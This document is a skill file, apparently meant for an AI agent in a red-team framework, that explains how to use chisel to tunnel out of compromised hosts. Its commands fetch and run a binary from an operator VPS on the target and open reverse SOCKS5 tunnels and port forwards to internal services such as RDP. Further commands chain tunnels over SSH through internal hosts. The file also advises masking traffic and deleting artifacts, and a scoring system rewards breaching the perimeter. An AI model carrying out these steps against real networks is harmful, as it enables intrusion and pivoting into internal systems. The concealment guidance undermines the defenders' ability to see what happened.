---
name: chisel-tunnel
description: "chisel tunnel: multiplexed tunnel over HTTP/WebSocket, highly effective for bypassing outbound egress restrictions and reverse proxies"
whenToUse: "When suo5 is not applicable (non-WebShell entry), the target only permits outbound HTTP/HTTPS, or when port forwarding/stable SOCKS5 is required"
role: internal
enabled: true
---

# chisel (HTTP Tunnel / Port Forwarding)

> **Load VPS Configuration First**: All `$REDTEAM_VPS_HOST` / `$VPS_USER` references in this skill originate from the local configuration,
> initially populated into `$DSH_HOME/.env` by `bash $DSH_HOME/redteam/setup.sh`. Source it prior to each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> If unconfigured, run `setup.sh` once (skill `redteam-setup`), which verifies SSH connectivity and payload hosting services.

`chisel` encapsulates TCP traffic inside **HTTP/WebSocket**, making it **the most effective tool for penetrating outbound policies and reverse proxies that only permit ports 80/443**.
Comparison with suo5:

| Metric | suo5 | chisel |
| --- | --- | --- |
| Entry Prerequisite | **Requires WebShell** (HTTP channel) | **Requires Command Execution** (executable binary capability) |
| Transport | HTTP persistent connection (masked as legitimate requests) | HTTP/WebSocket (upgrade request) |
| Strength | Internal network pivot via web entry, reusable by operators | Pivot via shell/RCE; flexible port forwarding |
| Traffic Noise | Low (resembles ordinary web traffic) | Low-Medium (WebSocket upgrade signatures) |

**Decision Matrix**: WebShell available -> prioritize `suo5-tunnel`; only command execution / RCE available or precise port forwarding required -> use chisel.

## Local Binary

| File | Path |
| --- | --- |
| chisel (Linux amd64, single binary for server and client) | `$DSH_HOME/redteam/toolkit/chisel/chisel` (v1.12.0) |

Synchronized to the VPS payload delivery directory: `http://$REDTEAM_VPS_HOST:9100/` (target can retrieve via direct `curl`).

## 1. Reverse SOCKS5 (Most Common: Target Connects Inward to Operator VPS)

```bash
# 1) Start server on operator VPS (run inside tmux to prevent SSH disconnect termination)
tmux new -s chisel
$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  Allow clients to register reverse tunnels
#    --socks5   Enable built-in SOCKS5 proxy on connection
#    Optional hardening: --auth user:pass  Enforce authentication against unauthorized usage
#    Optional masking: --backend http://127.0.0.1:80 Forward web requests to legitimate local site

# 2) Start client on target host (via existing RCE / command execution; pull binary first)
curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
#    R:socks = Reverse SOCKS; upon connection, VPS port 1080 serves as internal SOCKS5 gateway

# 3) Access internal network from local host via VPS SOCKS proxy
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    runs/proxychains-1080.conf contains: socks5 $REDTEAM_VPS_HOST 1080
#    Do NOT modify system /etc/proxychains4.conf; use -f pointing to temporary runs/ config
```

## 2. Reverse Port Forwarding (Exposing Specific Internal Service)

```bash
# Target side: Map internal 10.0.0.5:3389 to VPS port 13389
/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389

# Local machine: Direct connection to VPS:13389 reaches internal 3389
rdesktop $REDTEAM_VPS_HOST:13389
```

## 3. Forward SOCKS5 (Target Direct Connect Reachable from Operator)

```bash
# Start server on target side
/tmp/c server -p 9443 --socks5

# Start client on operator side for local forwarding
chisel client <target>:9443 1080:socks
# Route traffic via proxychains pointing to 127.0.0.1:1080
```

## 4. Multi-Hop / Chained Tunnels

```bash
# Existing Tunnel A (suo5 -> 127.0.0.1:1080); establish secondary chisel on internal Host B via Tunnel A
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
# Incrementally expand reachability; register tunnels and reachable subnets at each hop
```

## 5. Operational Discipline & Defense

1. **Execute inside tmux / nohup**: Tunnels terminate when terminal sessions close (`nohup ... &` or `tmux`).
2. **Server Authentication**: Chisel servers on public VPS instances will be scanned. Enforce `--auth user:pass` and `pkill` upon completion.
3. **Port Selection**: Avoid 80/443 (potential conflict with local web services). Use high ports like 9443/8443; **ensure cloud security group ingress is open**.
4. **Target Artifact Cleanup**: Remove `/tmp/c` upon completion. Avoid conspicuous file names or directory locations.
5. **Do not claim a self-hosted VPS proxy as an internal breach**: `entry_kind` registration must accurately represent the target endpoint (see below).

## 6. Output & Ledger Registration (Mandatory)

1. **Register Tunnel via `redteam_tunnel_add`** with all required fields:
   - `kind`: `chisel`
   - `listen`: **Usable listener address for the operator** (e.g. `$REDTEAM_VPS_HOST:1080` or `127.0.0.1:1080`)
   - `entry`: Target-side entry point (e.g. `/tmp/c client on 10.0.0.6 -> VPS:9443`)
   - `reach`: **Reachable subnet/network range** (e.g. `10.0.0.0/24`; verify empirically, do not guess)
   - `entry_kind`: **Must be `target-outbound`** (target outbound reverse connection / chisel client running on target), `target-http` (via target WebShell), or `target-agent` (via compromised target process).
     Setting `self-only` for local VPS proxies **will be flagged as not constituting a perimeter breach**.
   - `command`: Full command text (both server and client invocations).
2. **Validate Connectivity**: Test via `curl --socks5-hostname <listen> http://<internal_target>/` or `proxychains4 -f ... curl ...`.
   The tunnel is only confirmed upon successful response; then record status with `redteam_session_check`.
3. **Scoring**: Tunnel reaches internal network -> `redteam_score_hit` (`boundary`; evidence format: "tunnel_addr | reachable_subnet | verified_internal_target").
   Pivoting through tunnel to compromise additional hosts -> `server-host`.
4. **Operator Deliverable**: Provide a copy-pasteable configuration (`socks5://<listen>` or `ssh -D` / frp mapping), clearly specifying listening address and port, detailing the perimeter boundary crossed.
5. Record key events in `redteam_chain_add` (`stage_code=boundary-logical`), recording raw command in `tool` and response summary in `result`.
